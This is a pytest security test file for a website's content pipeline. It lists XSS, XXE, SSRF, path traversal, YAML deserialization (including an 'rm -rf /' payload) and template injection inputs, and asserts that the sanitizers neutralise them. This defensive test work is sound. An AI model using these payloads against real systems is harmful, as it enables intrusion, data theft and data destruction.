"""
Security tests for the AI Knowledge website.

Tests input validation, XSS prevention, content sanitization, and security best practices.
"""

import pytest
from typing import Dict, List
import re
import html
import urllib.parse
from unittest.mock import MagicMock, patch
from bs4 import BeautifulSoup

from pipelines.normalize.html_cleaner import HTMLCleaner
from pipelines.normalize.content_extractor import ContentExtractor
from pipelines.ingest.rss_fetcher import RSSFetcher
from pipelines.publish.markdown_generator import MarkdownGenerator


class TestInputValidation:
    """Test input validation and sanitization."""
    
    @pytest.fixture
    def html_cleaner(self):
        """Create HTMLCleaner instance for security testing."""
        return HTMLCleaner()
    
    @pytest.mark.security
    def test_xss_prevention_script_tags(self, html_cleaner):
        """Test prevention of script tag XSS attacks."""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<script type="text/javascript">alert("XSS")</script>',
            '<script src="malicious.js"></script>',
            '<SCRIPT>alert("XSS")</SCRIPT>',  # Case variation
            '<script\x20type="text/javascript">alert("XSS")</script>',  # Null byte
            '<script\x00>alert("XSS")</script>',
            '<script\n>alert("XSS")</script>',  # Newline
            '<script\r>alert("XSS")</script>',  # Carriage return
            '<script\t>alert("XSS")</script>',  # Tab
        ]
        
        for payload in xss_payloads:
            html_content = f'<div>Safe content {payload} more safe content</div>'
            cleaned = html_cleaner.clean(html_content)
            
            # Should not contain any script elements
            assert '<script' not in cleaned['cleaned_html'].lower()
            assert 'alert(' not in cleaned['cleaned_html']
            assert 'javascript:' not in cleaned['cleaned_html'].lower()
            
            # Should preserve safe content
            assert 'Safe content' in cleaned['plain_text']
            assert 'more safe content' in cleaned['plain_text']
    
    @pytest.mark.security
    def test_xss_prevention_event_handlers(self, html_cleaner):
        """Test prevention of event handler XSS attacks."""
        event_handler_payloads = [
            '<div onclick="alert(\'XSS\')">Click me</div>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<body onload="alert(\'XSS\')">',
            '<input type="text" onchange="alert(\'XSS\')">',
            '<a href="#" onmouseover="alert(\'XSS\')">Link</a>',
            '<div onkeydown="alert(\'XSS\')">Text</div>',
            '<form onsubmit="alert(\'XSS\')">',
            '<iframe onload="alert(\'XSS\')"></iframe>',
            '<object onload="alert(\'XSS\')"></object>',
            '<embed onload="alert(\'XSS\')"></embed>',
            # Case and encoding variations
            '<div ONCLICK="alert(\'XSS\')">',
            '<div onclick="alert(&quot;XSS&quot;)">',
            '<div onclick=alert(\'XSS\')>',
            '<div on\x00click="alert(\'XSS\')">',
        ]
        
        for payload in event_handler_payloads:
            cleaned = html_cleaner.clean(payload)
            
            # Should not contain any event handlers
            event_handlers = [
                'onclick', 'onload', 'onerror', 'onmouseover', 'onchange',
                'onkeydown', 'onsubmit', 'onfocus', 'onblur', 'onmouseout'
            ]
            
            for handler in event_handlers:
                assert handler not in cleaned['cleaned_html'].lower()
            
            # Should not contain alert calls
            assert 'alert(' not in cleaned['cleaned_html']
    
    @pytest.mark.security
    def test_xss_prevention_javascript_urls(self, html_cleaner):
        """Test prevention of javascript: URL XSS attacks."""
        javascript_url_payloads = [
            '<a href="javascript:alert(\'XSS\')">Click</a>',
            '<a href="JAVASCRIPT:alert(\'XSS\')">Click</a>',
            '<a href="javascript&colon;alert(\'XSS\')">Click</a>',
            '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(\'XSS\')">Click</a>',
            '<a href="j\x00avascript:alert(\'XSS\')">Click</a>',
            '<form action="javascript:alert(\'XSS\')">',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<object data="javascript:alert(\'XSS\')"></object>',
            '<embed src="javascript:alert(\'XSS\')">',
        ]
        
        for payload in javascript_url_payloads:
            cleaned = html_cleaner.clean(payload)
            
            # Should not contain javascript: URLs
            assert 'javascript:' not in cleaned['cleaned_html'].lower()
            assert 'javascript&colon;' not in cleaned['cleaned_html'].lower()
            assert 'alert(' not in cleaned['cleaned_html']
            
            # Should preserve safe attributes (non-javascript URLs should remain)
            safe_version = payload.replace('javascript:alert(\'XSS\')', 'https://example.com')
            safe_cleaned = html_cleaner.clean(safe_version)
            if 'href=' in safe_version or 'src=' in safe_version:
                assert 'https://example.com' in safe_cleaned['cleaned_html']
    
    @pytest.mark.security
    def test_xss_prevention_style_expressions(self, html_cleaner):
        """Test prevention of CSS expression XSS attacks."""
        css_expression_payloads = [
            '<div style="background: url(\'javascript:alert(\\\'XSS\\\')\')">',
            '<div style="background-image: url(javascript:alert(\'XSS\'))">',
            '<div style="width: expression(alert(\'XSS\'))">',
            '<div style="color: red; background: url(\'javascript:alert(\\\'XSS\\\')\')">',
            '<style>body { background: url("javascript:alert(\'XSS\')"); }</style>',
            '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        ]
        
        for payload in css_expression_payloads:
            cleaned = html_cleaner.clean(payload)
            
            # Should not contain dangerous CSS
            assert 'javascript:' not in cleaned['cleaned_html'].lower()
            assert 'expression(' not in cleaned['cleaned_html'].lower()
            assert 'alert(' not in cleaned['cleaned_html']
            
            # Style tags should be completely removed
            assert '<style' not in cleaned['cleaned_html'].lower()
    
    @pytest.mark.security
    def test_xss_prevention_meta_refresh(self, html_cleaner):
        """Test prevention of meta refresh XSS attacks."""
        meta_refresh_payloads = [
            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
            '<meta http-equiv="refresh" content="1; url=javascript:alert(\'XSS\')">',
            '<meta http-equiv="refresh" content="0;URL=\'javascript:alert(\\\'XSS\\\')\')">',
        ]
        
        for payload in meta_refresh_payloads:
            cleaned = html_cleaner.clean(payload)
            
            # Meta tags should typically be removed in content cleaning
            assert 'javascript:' not in cleaned['cleaned_html'].lower()
            assert 'alert(' not in cleaned['cleaned_html']
    
    @pytest.mark.security
    def test_html_injection_prevention(self, html_cleaner):
        """Test prevention of HTML injection attacks."""
        injection_payloads = [
            '<iframe src="http://malicious-site.com"></iframe>',
            '<object data="http://malicious-site.com/malware.swf"></object>',
            '<embed src="http://malicious-site.com/malware.swf">',
            '<applet code="MaliciousApplet">',
            '<form action="http://malicious-site.com/steal-data" method="post">',
            '<input type="hidden" name="csrf" value="stolen">',
            '<base href="http://malicious-site.com/">',
            '<link rel="stylesheet" href="http://malicious-site.com/malicious.css">',
        ]
        
        for payload in injection_payloads:
            cleaned = html_cleaner.clean(payload)
            
            # Dangerous elements should be removed
            dangerous_elements = ['iframe', 'object', 'embed', 'applet', 'base']
            for element in dangerous_elements:
                assert f'<{element}' not in cleaned['cleaned_html'].lower()
            
            # External URLs in dangerous contexts should be removed or sanitized
            assert 'malicious-site.com' not in cleaned['cleaned_html']
    
    @pytest.mark.security
    def test_content_type_validation(self):
        """Test content type validation and filtering."""
        content_extractor = ContentExtractor()
        
        # Test with various content types that should be rejected
        dangerous_content_types = [
            'application/x-shockwave-flash',
            'application/java-archive',
            'application/x-msdownload', 
            'application/octet-stream',
            'text/x-shellscript',
            'application/x-executable'
        ]
        
        for content_type in dangerous_content_types:
            # Mock response with dangerous content type
            with patch('aiohttp.ClientSession.get') as mock_get:
                mock_response = MagicMock()
                mock_response.headers = {'content-type': content_type}
                mock_response.status = 200
                mock_response.text.return_value = '<html><body>Test</body></html>'
                mock_get.return_value.__aenter__.return_value = mock_response
                
                # Content extraction should handle or reject dangerous content types
                # (Implementation may vary, but should not execute dangerous content)
                result = content_extractor._validate_content_type(content_type)
                assert result == False or content_type in ['text/html', 'text/plain', 'application/xml', 'text/xml']
    
    @pytest.mark.security 
    def test_url_validation_and_sanitization(self):
        """Test URL validation and sanitization."""
        rss_fetcher = RSSFetcher()
        
        malicious_urls = [
            'javascript:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
            'vbscript:msgbox("XSS")',
            'file:///etc/passwd',
            'ftp://malicious-site.com/steal-data',
            '//malicious-site.com/steal-data',
            'http://localhost:22/ssh-attack',
            'http://169.254.169.254/metadata',  # AWS metadata endpoint
            'http://[::1]:22/',
            'gopher://malicious-site.com:1337/',
        ]
        
        for malicious_url in malicious_urls:
            is_valid = rss_fetcher._validate_url(malicious_url)
            
            # Should reject dangerous URLs
            assert is_valid == False, f"Dangerous URL not rejected: {malicious_url}"
        
        # Valid URLs should be accepted
        valid_urls = [
            'https://example.com',
            'http://example.com',
            'https://blog.example.com/feed.xml',
            'http://subdomain.example.com:8080/path',
        ]
        
        for valid_url in valid_urls:
            is_valid = rss_fetcher._validate_url(valid_url)
            assert is_valid == True, f"Valid URL rejected: {valid_url}"
    
    @pytest.mark.security
    def test_filename_injection_prevention(self):
        """Test prevention of filename injection attacks."""
        markdown_generator = MarkdownGenerator()
        
        malicious_filenames = [
            '../../../etc/passwd',
            '..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\config\\SAM',
            'file with spaces and "quotes"',
            'file\x00with\x00nulls',
            'file\nwith\nnewlines',
            'file\rwith\rreturns',
            'file\twith\ttabs',
            'file;with;semicolons',
            'file|with|pipes',
            'file&with&ampersands',
            'file<with>brackets',
            'file*with?wildcards',
        ]
        
        for malicious_filename in malicious_filenames:
            sanitized = markdown_generator._sanitize_filename(malicious_filename)
            
            # Should not contain path traversal
            assert '..' not in sanitized
            assert '/' not in sanitized or sanitized.startswith('/')
            assert '\\' not in sanitized
            
            # Should not contain dangerous characters
            dangerous_chars = ['\x00', '\n', '\r', '\t', ';', '|', '&', '<', '>', '*', '?', '"', "'"]
            for char in dangerous_chars:
                assert char not in sanitized
            
            # Should have some content (not completely empty)
            assert len(sanitized.strip()) > 0
    
    @pytest.mark.security
    def test_xml_external_entity_prevention(self):
        """Test prevention of XXE (XML External Entity) attacks."""
        rss_fetcher = RSSFetcher()
        
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE rss [
                <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <rss version="2.0">
                <channel>
                    <title>&xxe;</title>
                    <description>XXE Attack</description>
                </channel>
            </rss>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE rss [
                <!ENTITY xxe SYSTEM "http://malicious-site.com/steal-data">
            ]>
            <rss version="2.0">
                <channel>
                    <title>&xxe;</title>
                </channel>
            </rss>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE rss [
                <!ENTITY % xxe SYSTEM "http://malicious-site.com/malicious.dtd">
                %xxe;
            ]>
            <rss version="2.0">
                <channel><title>Test</title></channel>
            </rss>''',
        ]
        
        for xxe_payload in xxe_payloads:
            # Should either reject the XML or safely parse without executing entities
            try:
                parsed_items = rss_fetcher._parse_rss_content(xxe_payload)
                
                # If parsing succeeds, should not contain sensitive data
                for item in parsed_items:
                    assert 'root:' not in str(item)  # /etc/passwd content
                    assert '/bin/bash' not in str(item)
                    assert 'malicious-site.com' not in str(item)
                    
            except Exception as e:
                # Rejecting XXE is also acceptable
                assert 'entity' in str(e).lower() or 'external' in str(e).lower() or 'dtd' in str(e).lower()
    
    @pytest.mark.security
    def test_input_length_validation(self):
        """Test input length validation to prevent DoS attacks."""
        content_extractor = ContentExtractor()
        
        # Test extremely long inputs
        very_long_title = 'A' * 10000
        very_long_content = 'Content ' * 100000  # ~700KB
        very_long_url = 'https://example.com/' + 'a' * 5000
        
        # Should handle or reject overly long inputs gracefully
        long_html = f'''
        <html>
        <head><title>{very_long_title}</title></head>
        <body>
            <h1>{very_long_title}</h1>
            <p>{very_long_content}</p>
        </body>
        </html>
        '''
        
        # Should not crash and should apply reasonable limits
        result = content_extractor._validate_input_length(long_html, very_long_url)
        
        # Should either reject or truncate overly long inputs
        if result:
            assert len(result.get('title', '')) <= 500  # Reasonable title limit
            assert len(result.get('content', '')) <= 100000  # Reasonable content limit
    
    @pytest.mark.security
    def test_encoding_attack_prevention(self, html_cleaner):
        """Test prevention of encoding-based XSS attacks."""
        encoding_attack_payloads = [
            # HTML entity encoding
            '&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;',
            '&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;',
            '&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt;',
            
            # URL encoding
            '%3Cscript%3Ealert(%27XSS%27)%3C/script%3E',
            '%253Cscript%253Ealert(%2527XSS%2527)%253C/script%253E',
            
            # Unicode encoding
            '\\u003cscript\\u003ealert(\\u0027XSS\\u0027)\\u003c/script\\u003e',
            
            # Mixed encoding
            '&lt;script%3Ealert(&#39;XSS&#39;)%3C/script&gt;',
        ]
        
        for payload in encoding_attack_payloads:
            # Test both direct payload and URL decoded version
            test_payloads = [payload, urllib.parse.unquote(payload)]
            
            for test_payload in test_payloads:
                html_content = f'<div>Safe content {test_payload} more content</div>'
                cleaned = html_cleaner.clean(html_content)
                
                # Should not contain script elements after any decoding
                assert '<script' not in cleaned['cleaned_html'].lower()
                assert 'alert(' not in cleaned['cleaned_html']
                assert 'javascript:' not in cleaned['cleaned_html'].lower()


class TestSecurityHeaders:
    """Test security-related header validation and processing."""
    
    @pytest.mark.security
    def test_csp_compliance_validation(self):
        """Test Content Security Policy compliance validation."""
        # This would test that generated content complies with CSP
        content_extractor = ContentExtractor()
        
        # Content that would violate CSP
        csp_violating_content = '''
        <html>
        <body>
            <script>inline_script_here()</script>
            <div onclick="handler_here()">Click</div>
            <style>body { color: red; }</style>
            <iframe src="https://untrusted-domain.com"></iframe>
        </body>
        </html>
        '''
        
        # Should clean content to be CSP compliant
        result = content_extractor._ensure_csp_compliance(csp_violating_content)
        
        # Should not contain CSP-violating elements
        assert '<script>' not in result.lower()
        assert 'onclick=' not in result.lower()
        assert '<style>' not in result.lower()
        # iframes from untrusted domains should be removed or sandboxed
    
    @pytest.mark.security
    def test_referrer_policy_validation(self):
        """Test referrer policy validation for external links."""
        html_cleaner = HTMLCleaner()
        
        content_with_external_links = '''
        <div>
            <a href="https://external-site.com">External link</a>
            <a href="https://another-external.com/sensitive-page">Another link</a>
            <a href="/internal-link">Internal link</a>
        </div>
        '''
        
        cleaned = html_cleaner.clean(content_with_external_links)
        
        # External links should have appropriate referrer policy
        if 'href="https://external' in cleaned['cleaned_html']:
            # Should add rel="noopener noreferrer" for security
            assert 'rel=' in cleaned['cleaned_html']
            assert 'noopener' in cleaned['cleaned_html'] or 'noreferrer' in cleaned['cleaned_html']


class TestDataSanitization:
    """Test data sanitization and output encoding."""
    
    @pytest.mark.security
    def test_markdown_injection_prevention(self):
        """Test prevention of Markdown injection attacks."""
        markdown_generator = MarkdownGenerator()
        
        markdown_injection_payloads = [
            '[XSS](javascript:alert("XSS"))',
            '![XSS](javascript:alert("XSS"))',
            '[XSS]: javascript:alert("XSS")',
            '![][XSS]\n[XSS]: javascript:alert("XSS")',
            '```html\n<script>alert("XSS")</script>\n```',
            '<script>alert("XSS")</script>',  # Raw HTML in markdown
            '> <script>alert("XSS")</script>',  # In blockquote
            '* <script>alert("XSS")</script>',  # In list
        ]
        
        for payload in markdown_injection_payloads:
            test_data = {
                'title': 'Safe Title',
                'content': f'Safe content before {payload} safe content after',
                'category': 'test',
                'slug': 'test-article',
                'published_date': '2024-01-15T10:00:00'
            }
            
            markdown_output = markdown_generator.generate_article_markdown(test_data)
            
            # Should not contain dangerous JavaScript
            assert 'javascript:' not in markdown_output.lower()
            assert '<script>' not in markdown_output.lower()
            assert 'alert(' not in markdown_output
            
            # Should preserve safe content
            assert 'Safe content before' in markdown_output
            assert 'safe content after' in markdown_output
    
    @pytest.mark.security
    def test_frontmatter_injection_prevention(self):
        """Test prevention of YAML injection in frontmatter."""
        markdown_generator = MarkdownGenerator()
        
        yaml_injection_payloads = [
            'title: Normal\nmalicious_field: !!python/object/apply:os.system ["rm -rf /"]',
            'title: |\n  Multi-line title\n  with dangerous: content',
            "title: 'quoted with embedded quotes: \"dangerous\"'",
            'title: Normal\ntags:\n  - "tag1"\n  - !!python/object/apply:subprocess.call ["malicious_command"]',
            'title: >-\n  Folded title with\n  embedded newlines and: colons',
        ]
        
        for payload_title in yaml_injection_payloads:
            test_data = {
                'title': payload_title,
                'content': 'Safe content',
                'category': 'test',
                'slug': 'test-article',
                'published_date': '2024-01-15T10:00:00'
            }
            
            try:
                markdown_output = markdown_generator.generate_article_markdown(test_data)
                
                # Should not contain dangerous YAML constructs
                assert '!!python/' not in markdown_output
                assert 'subprocess' not in markdown_output
                assert 'os.system' not in markdown_output
                
                # Should be valid YAML that doesn't execute code
                frontmatter_section = markdown_output.split('---')[1]
                import yaml
                parsed = yaml.safe_load(frontmatter_section)  # Use safe_load only
                assert isinstance(parsed, dict)
                
            except Exception as e:
                # Rejecting dangerous input is also acceptable
                assert 'yaml' in str(e).lower() or 'unsafe' in str(e).lower()
    
    @pytest.mark.security
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks in file operations."""
        markdown_generator = MarkdownGenerator()
        
        path_traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/passwd',
            'C:\\Windows\\System32\\config\\SAM',
            './../../sensitive-file',
            'normal-file/../../../etc/passwd',
            'subdir/../../etc/passwd',
        ]
        
        for malicious_path in path_traversal_payloads:
            # Test file path sanitization
            safe_path = markdown_generator._sanitize_file_path(malicious_path)
            
            # Should not contain path traversal sequences
            assert '..' not in safe_path
            assert safe_path.startswith('/') == False or safe_path.startswith('/safe/')
            assert '\\' not in safe_path
            
            # Should be within safe directory bounds
            assert not safe_path.startswith('/etc/')
            assert not safe_path.startswith('C:\\')
            assert 'passwd' not in safe_path.lower()
            assert 'config' not in safe_path.lower()
    
    @pytest.mark.security
    def test_template_injection_prevention(self):
        """Test prevention of template injection attacks."""
        markdown_generator = MarkdownGenerator()
        
        template_injection_payloads = [
            '{{7*7}}',
            '${7*7}',
            '<%=7*7%>',
            '{%raw%}{{dangerous_code}}{%endraw%}',
            '{{config.items()}}',
            '{{request.environ}}',
            '${T(java.lang.Runtime).getRuntime().exec("malicious_command")}',
            '{{lipsum.__globals__["os"].system("malicious_command")}}',
        ]
        
        for payload in template_injection_payloads:
            test_data = {
                'title': f'Title with {payload}',
                'content': f'Content with template injection: {payload}',
                'category': 'test',
                'slug': 'test-article',
                'published_date': '2024-01-15T10:00:00'
            }
            
            markdown_output = markdown_generator.generate_article_markdown(test_data)
            
            # Should not execute template expressions
            assert '49' not in markdown_output  # 7*7 should not be evaluated
            assert 'config.items' not in markdown_output
            assert 'request.environ' not in markdown_output
            assert 'java.lang.Runtime' not in markdown_output
            assert 'os.system' not in markdown_output
            assert '__globals__' not in markdown_output
            
            # Template syntax should be escaped or removed
            dangerous_patterns = ['{{', '}}', '${', '}', '<%=', '%>']
            for pattern in dangerous_patterns:
                if pattern in payload:
                    # Should be escaped or sanitized
                    assert payload not in markdown_output or all(
                        html.escape(pattern) in markdown_output for pattern in dangerous_patterns
                    )


class TestAccessControl:
    """Test access control and authorization mechanisms."""
    
    @pytest.mark.security
    def test_rate_limiting_simulation(self):
        """Test rate limiting protection against abuse."""
        # This would test rate limiting if implemented
        rss_fetcher = RSSFetcher()
        
        # Simulate rapid requests
        request_count = 100
        successful_requests = 0
        rate_limited_requests = 0
        
        for i in range(request_count):
            try:
                # Mock rate limiting check
                if rss_fetcher._check_rate_limit('test-ip'):
                    successful_requests += 1
                else:
                    rate_limited_requests += 1
            except Exception as e:
                if 'rate limit' in str(e).lower():
                    rate_limited_requests += 1
        
        # Should have some rate limiting after many requests
        assert rate_limited_requests > 0 or successful_requests < request_count
    
    @pytest.mark.security
    def test_resource_exhaustion_protection(self):
        """Test protection against resource exhaustion attacks."""
        content_extractor = ContentExtractor()
        
        # Test with extremely large content
        large_content_attacks = [
            'A' * 10_000_000,  # 10MB string
            '<div>' * 1_000_000 + 'content' + '</div>' * 1_000_000,  # Deeply nested HTML
            '<!--' + 'comment' * 100_000 + '-->',  # Large comment
        ]
        
        for attack_content in large_content_attacks:
            start_time = time.time()
            
            try:
                # Should either reject, truncate, or process within reasonable time
                result = content_extractor._validate_resource_usage(attack_content)
                processing_time = time.time() - start_time
                
                # Should not take excessive time or memory
                assert processing_time < 10.0, f"Processing took too long: {processing_time:.2f}s"
                
                # Should limit output size
                if result and 'content' in result:
                    assert len(result['content']) < 1_000_000, "Output not properly limited"
                
            except Exception as e:
                # Rejecting resource-intensive content is acceptable
                assert 'resource' in str(e).lower() or 'limit' in str(e).lower() or 'size' in str(e).lower()


class TestPrivacyProtection:
    """Test privacy protection and data handling."""
    
    @pytest.mark.security
    def test_pii_detection_and_removal(self, html_cleaner):
        """Test detection and removal of personally identifiable information."""
        content_with_pii = '''
        <div>
            <p>Contact John Doe at john.doe@example.com or call 555-123-4567.</p>
            <p>His social security number is 123-45-6789.</p>
            <p>Credit card: 4111-1111-1111-1111</p>
            <p>Address: 123 Main St, Anytown, ST 12345</p>
            <p>IP address: 192.168.1.1</p>
        </div>
        '''
        
        # Should detect and optionally redact PII
        cleaned = html_cleaner.clean(content_with_pii)
        pii_detected = html_cleaner._detect_pii(content_with_pii)
        
        # Should identify PII patterns
        assert pii_detected['email_count'] > 0
        assert pii_detected['phone_count'] > 0
        assert pii_detected['ssn_count'] > 0
        assert pii_detected['credit_card_count'] > 0
        
        # Could optionally redact PII in output
        if html_cleaner.redact_pii:
            assert 'john.doe@example.com' not in cleaned['plain_text']
            assert '555-123-4567' not in cleaned['plain_text']
            assert '123-45-6789' not in cleaned['plain_text']
    
    @pytest.mark.security
    def test_sensitive_data_filtering(self):
        """Test filtering of sensitive data patterns."""
        content_extractor = ContentExtractor()
        
        sensitive_patterns = [
            'password: secretpassword123',
            'api_key: sk_live_abc123def456',
            'token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
            'secret: my_secret_key_value',
            'private_key: -----BEGIN PRIVATE KEY-----',
            'database_url: postgresql://user:pass@localhost/db',
        ]
        
        for pattern in sensitive_patterns:
            test_content = f'<html><body><p>Some content. {pattern} More content.</p></body></html>'
            
            # Should detect sensitive patterns
            has_sensitive_data = content_extractor._contains_sensitive_data(test_content)
            assert has_sensitive_data == True, f"Failed to detect: {pattern}"
            
            # Should optionally filter sensitive data
            filtered = content_extractor._filter_sensitive_data(test_content)
            sensitive_keywords = ['password', 'api_key', 'token', 'secret', 'private_key']
            
            for keyword in sensitive_keywords:
                if keyword in pattern:
                    # Sensitive values should be redacted or removed
                    assert pattern not in filtered or '[REDACTED]' in filtered